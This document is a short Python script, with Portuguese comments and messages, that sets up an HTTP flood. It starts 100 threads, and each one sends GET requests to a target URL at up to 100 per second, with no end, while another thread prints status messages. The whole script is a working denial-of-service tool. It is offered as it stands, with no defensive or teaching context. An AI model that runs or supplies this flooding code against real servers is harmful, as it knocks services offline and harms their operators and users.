import requests
import threading
import time
import datetime

target_url = "http://example.com"
num_threads = 100
request_interval = 0.1  # 100 ms
request_timeout = 5  # 5 segundos
max_requests_per_second = 100

def http_flood():
    while True:
        start_time = time.time()
        for i in range(max_requests_per_second):
            try:
                response = requests.get(target_url, timeout=request_timeout)
                print(f"Request enviada para {target_url} ás {datetime.datetime.now()}")
            except:
                print("Erro ao enviar a requisição")
        elapsed_time = time.time() - start_time
        if elapsed_time < 1:
            time.sleep(1 - elapsed_time)

def monitor_traffic():
    while True:
        print(f"Monitorando o tráfego às {datetime.datetime.now()}")
        time.sleep(60)  # Monitora a cada 60 segundos

threads = []
for i in range(num_threads):
    t = threading.Thread(target=http_flood)
    threads.append(t)
    t.start()

monitor_thread = threading.Thread(target=monitor_traffic)
monitor_thread.start()

for t in threads:
    t.join()

monitor_thread.join()